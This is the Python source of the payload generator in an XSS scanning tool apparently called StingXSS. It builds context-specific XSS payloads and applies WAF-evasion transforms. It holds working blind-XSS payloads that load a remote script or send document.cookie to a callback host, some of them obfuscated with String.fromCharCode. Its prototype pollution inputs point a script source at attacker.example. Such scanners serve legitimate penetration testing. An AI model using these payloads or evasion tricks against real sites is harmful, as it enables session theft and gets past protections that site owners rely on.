# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
StingXSS — engine/payload_gen.py
Context-aware XSS payload generator with WAF evasion transforms.

Logic:
  1. Select a base payload set for the detected ReflectionContext.
  2. Apply WAF evasion transforms appropriate to the detected WAF strategy.
  3. Append any user-supplied custom payloads.
  4. Return a deduplicated list ready for injection.
"""

from __future__ import annotations

import base64
import random
import re
import string
import urllib.parse
from typing import List, Optional

from ..reporter import ReflectionContext
from ..http.waf_detect import (
  EVASION_BACKTICK,
  EVASION_CASE_MIXING,
  EVASION_CHUNKED_TAGS,
  EVASION_COMMENT_BREAK,
  EVASION_CSS_EXPR,
  EVASION_DOUBLE_ENCODE,
  EVASION_HTML_ENCODE,
  EVASION_NEWLINE,
  EVASION_NONE,
  EVASION_NULL_BYTE,
  EVASION_UNICODE,
)
from ._payloads.html_context import (
  HTML_BODY,
  ATTR_DOUBLE,
  ATTR_SINGLE,
  ATTR_UNQUOTED,
  ATTR_NAME,
  TAG_NAME,
  TEXTAREA,
  TITLE,
  NOSCRIPT,
  IFRAME_SRCDOC,
  OBJECT_DATA,
  COMMENT,
  CSS,
  CSS_VALUE,
)
from ._payloads.script_context import (
  SCRIPT_STRING_D,
  SCRIPT_STRING_S,
  SCRIPT_BARE,
  SCRIPT_TEMPLATE,
  SCRIPT_REGEX,
  SCRIPT_COMMENT,
  EVENT_HANDLER,
  URL_ATTR,
  SCRIPT_SRC,
)
from ._payloads.advanced import (
  ANGULAR_TEMPLATE,
  ANGULAR_TEMPLATE_ALT,
  ANGULAR_ATTR,
  VUE_TEMPLATE,
  JS_HOISTING,
  DANGLING_MARKUP,
  CSS_TRANSITION,
  EXTRA_NO_INTERACTION,
  FILE_UPLOAD,
  RESTRICTED_CHARS,
  POLYGLOT,
  WAF_BYPASS_GLOBAL,
  PROTOTYPE_POLLUTION,
  CLASSIC_LEGACY,
  ENCODING,
  CONTENT_TYPE,
  MODERN_BROWSER,
  STORED_XSS,
)

# ---------------------------------------------------------------------------
# Confirmation marker — unique string embedded in every payload.
# ---------------------------------------------------------------------------
CONFIRM_MARKER_PREFIX = "vXSS_EXEC_"


def make_confirm_marker() -> str:
  suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
  return f"{CONFIRM_MARKER_PREFIX}{suffix}"


# ---------------------------------------------------------------------------
# Context → payload list map
# ---------------------------------------------------------------------------
_CONTEXT_MAP = {
  ReflectionContext.HTML_BODY:            HTML_BODY,
  ReflectionContext.ATTR_DOUBLE:          ATTR_DOUBLE,
  ReflectionContext.ATTR_SINGLE:          ATTR_SINGLE,
  ReflectionContext.ATTR_UNQUOTED:        ATTR_UNQUOTED,
  ReflectionContext.ATTR_NAME:            ATTR_NAME,
  ReflectionContext.SCRIPT_STRING_D:      SCRIPT_STRING_D,
  ReflectionContext.SCRIPT_STRING_S:      SCRIPT_STRING_S,
  ReflectionContext.SCRIPT_BARE:          SCRIPT_BARE,
  ReflectionContext.SCRIPT_TEMPLATE:      SCRIPT_TEMPLATE,
  ReflectionContext.SCRIPT_REGEX:         SCRIPT_REGEX,
  ReflectionContext.SCRIPT_COMMENT:       SCRIPT_COMMENT,
  ReflectionContext.EVENT_HANDLER:        EVENT_HANDLER,
  ReflectionContext.URL_ATTR:             URL_ATTR,
  ReflectionContext.SCRIPT_SRC:           SCRIPT_SRC,
  ReflectionContext.CSS:                  CSS,
  ReflectionContext.CSS_VALUE:            CSS_VALUE,
  ReflectionContext.TEXTAREA:             TEXTAREA,
  ReflectionContext.TITLE:                TITLE,
  ReflectionContext.IFRAME_SRCDOC:        IFRAME_SRCDOC,
  ReflectionContext.NOSCRIPT:             NOSCRIPT,
  ReflectionContext.OBJECT_DATA:          OBJECT_DATA,
  ReflectionContext.TAG_NAME:             TAG_NAME,
  ReflectionContext.COMMENT:              COMMENT,
  ReflectionContext.ANGULAR_TEMPLATE:     ANGULAR_TEMPLATE,
  ReflectionContext.ANGULAR_TEMPLATE_ALT: ANGULAR_TEMPLATE_ALT,
  ReflectionContext.ANGULAR_ATTR:         ANGULAR_ATTR,
  ReflectionContext.VUE_TEMPLATE:         VUE_TEMPLATE,
  ReflectionContext.JS_HOISTING:          JS_HOISTING,
  ReflectionContext.DANGLING_MARKUP:      DANGLING_MARKUP,
  ReflectionContext.UNKNOWN:              HTML_BODY + ATTR_DOUBLE,
}


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def generate(
  context:        ReflectionContext,
  evasion:        str = EVASION_NONE,
  marker:         Optional[str] = None,
  custom_payloads: Optional[List[str]] = None,
  level:          int = 1,
) -> List[str]:
  """
  Return a list of payloads tuned for `context` with `evasion` applied.

  level 1 = first 3 payloads per context (fast)
  level 2 = first 6
  level 3 = all
  """
  if marker is None:
    marker = make_confirm_marker()

  base = _CONTEXT_MAP.get(context, HTML_BODY)

  limits = {1: 3, 2: 6, 3: len(base)}
  base = base[: limits.get(level, 3)]

  payloads = [p.format(marker=marker) for p in base]

  # Resolve base64 data-URL sentinel: "__B64_DATA_URL__:<marker>" →
  # <object data='data:text/html;base64,...'> with the marker embedded inside.
  resolved = []
  for p in payloads:
    if p.startswith("__B64_DATA_URL__:"):
      inner_marker = p[len("__B64_DATA_URL__:"):]
      inner_html = f"<script>alert('{inner_marker}')</script>"
      encoded = base64.b64encode(inner_html.encode()).decode()
      resolved.append(f"data:text/html;base64,{encoded}")
    else:
      resolved.append(p)
  payloads = resolved

  if evasion != EVASION_NONE:
    transformed = []
    for p in payloads:
      transformed.extend(_apply_evasion(p, evasion))
    payloads = transformed

  if custom_payloads:
    payloads.extend(custom_payloads)

  # Deduplicate preserving order
  seen: set = set()
  result = []
  for p in payloads:
    if p not in seen:
      seen.add(p)
      result.append(p)

  return result


def blind_payloads(callback_url: str) -> List[str]:
  """Return blind XSS payloads that phone home to `callback_url`."""
  cb = callback_url.rstrip("/")
  return [
    f'"><script src="{cb}/venom.js"></script>',
    f"'><script src='{cb}/venom.js'></script>",
    f"<img src=x onerror=\"var s=document.createElement('script');s.src='{cb}/venom.js';document.head.appendChild(s)\">",
    f"javascript:eval(String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39))+'{cb}/venom.js'+String.fromCharCode(39,59,100,111,99,117,109,101,110,116,46,104,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41))",
    f"</script><script>fetch('{cb}/?c='+document.cookie)</script>",
    f'<svg><animate onbegin=\'fetch("{cb}/?c="+document.cookie)\' attributeName=x dur=1s>',
    f'<svg><animate onend=\'fetch("{cb}/?c="+document.cookie)\' attributeName=x dur=1s>',
    f'<xss oncontentvisibilityautostatechange=\'fetch("{cb}/?c="+document.cookie)\' style=display:block;content-visibility:auto>',
    f'<style>@keyframes x{{}}</style><xss style="animation-name:x" onanimationend=\'fetch("{cb}/?c="+document.cookie)\'></xss>',
    f'<xss onfocus=\'fetch("{cb}/?c="+document.cookie)\' autofocus tabindex=1>',
  ]


def file_upload_payloads(marker: Optional[str] = None) -> List[str]:
  """Return payloads for injection into uploaded SVG/HTML files."""
  if marker is None:
    marker = make_confirm_marker()
  return [p.format(marker=marker) for p in FILE_UPLOAD]


def restricted_char_payloads(marker: Optional[str] = None) -> List[str]:
  """Return payloads for environments that filter parens, angle brackets, etc."""
  if marker is None:
    marker = make_confirm_marker()
  return [p.format(marker=marker) for p in RESTRICTED_CHARS]


def polyglot_payloads(marker: Optional[str] = None) -> List[str]:
  """Return multi-context polyglot payloads."""
  if marker is None:
    marker = make_confirm_marker()
  return [p.format(marker=marker) for p in POLYGLOT]


def waf_bypass_payloads(marker: Optional[str] = None) -> List[str]:
  """Return WAF-bypass payloads using global object obfuscation."""
  if marker is None:
    marker = make_confirm_marker()
  return [p.format(marker=marker) for p in WAF_BYPASS_GLOBAL]


def prototype_pollution_payloads(marker: Optional[str] = None) -> List[str]:
  """Return prototype pollution gadget payloads."""
  if marker is None:
    marker = make_confirm_marker()
  return [p.format(marker=marker) for p in PROTOTYPE_POLLUTION]


def classic_legacy_payloads(marker: Optional[str] = None) -> List[str]:
  """Return classic/legacy XSS vectors (marquee, VBScript, etc.)."""
  if marker is None:
    marker = make_confirm_marker()
  return [p.format(marker=marker) for p in CLASSIC_LEGACY]


def encoding_payloads(marker: Optional[str] = None) -> List[str]:
  """Return encoding-based bypass payloads."""
  if marker is None:
    marker = make_confirm_marker()
  return [p.format(marker=marker) for p in ENCODING]


def content_type_payloads(marker: Optional[str] = None) -> List[str]:
  """Return payloads for SVG/XML/XSL/XHTML content-type responses."""
  if marker is None:
    marker = make_confirm_marker()
  return [p.format(marker=marker) for p in CONTENT_TYPE]


def css_transition_payloads(marker: Optional[str] = None) -> List[str]:
  """Return CSS transition/webkit animation event payloads."""
  if marker is None:
    marker = make_confirm_marker()
  return [p.format(marker=marker) for p in CSS_TRANSITION]


def extra_no_interaction_payloads(marker: Optional[str] = None) -> List[str]:
  """Return additional no-interaction event payloads."""
  if marker is None:
    marker = make_confirm_marker()
  return [p.format(marker=marker) for p in EXTRA_NO_INTERACTION]


def modern_browser_payloads(marker: Optional[str] = None) -> List[str]:
  """Return modern browser API abuse payloads (Import Maps, Shadow DOM, Trusted Types, etc.)."""
  if marker is None:
    marker = make_confirm_marker()
  return [p.format(marker=marker) for p in MODERN_BROWSER]


def stored_xss_payloads(marker: Optional[str] = None) -> List[str]:
  """Return stored XSS payloads: keylogger, form hijack, WebSocket, localStorage, etc."""
  if marker is None:
    marker = make_confirm_marker()
  return [p.format(marker=marker) for p in STORED_XSS]


def prototype_pollution_params(marker: Optional[str] = None) -> List[tuple[str, str]]:
  """
  Return (param_name, value) pairs for active prototype pollution testing.
  These inject via query string like ?__proto__[key]=value.
  """
  if marker is None:
    marker = make_confirm_marker()
  return [
    ("__proto__[html]",          f"<img src=x onerror=alert('{marker}')>"),
    ("__proto__[src]",           f"//attacker.example/{marker}.js"),
    ("__proto__[innerText]",     f"<img src=x onerror=alert('{marker}')>"),
    ("__proto__[sourceURL]",     f"\nalert('{marker}')"),
    ("__proto__[ALLOWED_TAGS][]","script"),
    ("constructor[prototype][html]", f"<img src=x onerror=alert('{marker}')>"),
    ("__proto__[template]",      f"<img src=x onerror=alert('{marker}')>"),
  ]


# ---------------------------------------------------------------------------
# Evasion transforms
# ---------------------------------------------------------------------------

def _apply_evasion(payload: str, evasion: str) -> List[str]:
  """Return [original, transformed] — always include the original."""
  variants = [payload]
  try:
    if evasion == EVASION_CASE_MIXING:
      variants.append(_case_mix(payload))
    elif evasion == EVASION_HTML_ENCODE:
      variants.append(_html_encode_lt_gt(payload))
    elif evasion == EVASION_UNICODE:
      variants.append(_unicode_escape_alpha(payload))
    elif evasion == EVASION_DOUBLE_ENCODE:
      variants.append(_double_url_encode(payload))
    elif evasion == EVASION_CHUNKED_TAGS:
      variants.append(_chunked_tag(payload))
    elif evasion == EVASION_NULL_BYTE:
      variants.append(_null_byte_inject(payload))
    elif evasion == EVASION_NEWLINE:
      variants.append(_newline_inject(payload))
    elif evasion == EVASION_COMMENT_BREAK:
      variants.append(_comment_break(payload))
    elif evasion == EVASION_BACKTICK:
      variants.append(_backtick_attr(payload))
    elif evasion == EVASION_CSS_EXPR:
      variants.append(_css_expression_break(payload))
  except Exception:
    pass
  return variants


def _case_mix(s: str) -> str:
  """Alternate upper/lower on alpha chars."""
  result = []
  toggle = True
  for c in s:
    if c.isalpha():
      result.append(c.upper() if toggle else c.lower())
      toggle = not toggle
    else:
      result.append(c)
  return "".join(result)


def _html_encode_lt_gt(s: str) -> str:
  return s.replace("<", "&#60;").replace(">", "&#62;")


def _unicode_escape_alpha(s: str) -> str:
  """Unicode-escape alphabetic chars in tag/event names."""
  def esc(m: re.Match) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in m.group())
  return re.sub(r"[a-zA-Z]{2,}", esc, s)


def _double_url_encode(s: str) -> str:
  """URL-encode special chars twice."""
  once = urllib.parse.quote(s, safe="")
  return urllib.parse.quote(once, safe="")


def _chunked_tag(s: str) -> str:
  """Split tag names and break event handler names with /**/."""
  s = re.sub(r"<(script)", r"<\1 ", s, flags=re.IGNORECASE)
  s = re.sub(r"\b(on\w+)\b", lambda m: m.group()[:3] + "/**/" + m.group()[3:], s)
  return s


def _null_byte_inject(s: str) -> str:
  """Insert a null byte after the first < to confuse WAF parsers."""
  return s.replace("<", "<\x00", 1)


def _newline_inject(s: str) -> str:
  """Replace spaces with %0a."""
  return s.replace(" ", "%0a")


def _comment_break(s: str) -> str:
  """Insert <!--/--> inside tag keywords."""
  return re.sub(r"<(/?)(script|img|svg|iframe|body|details|video|input)",
                r"<\1\2<!---->", s, flags=re.IGNORECASE)


def _backtick_attr(s: str) -> str:
  """Replace attribute quote chars with backticks (IE legacy trick)."""
  return s.replace('"', "`").replace("'", "`")


def _css_expression_break(s: str) -> str:
  """Break 'expression' with a CSS comment to bypass keyword filters."""
  return re.sub(r"\bexpression\b", "ex/**/pression", s, flags=re.IGNORECASE)
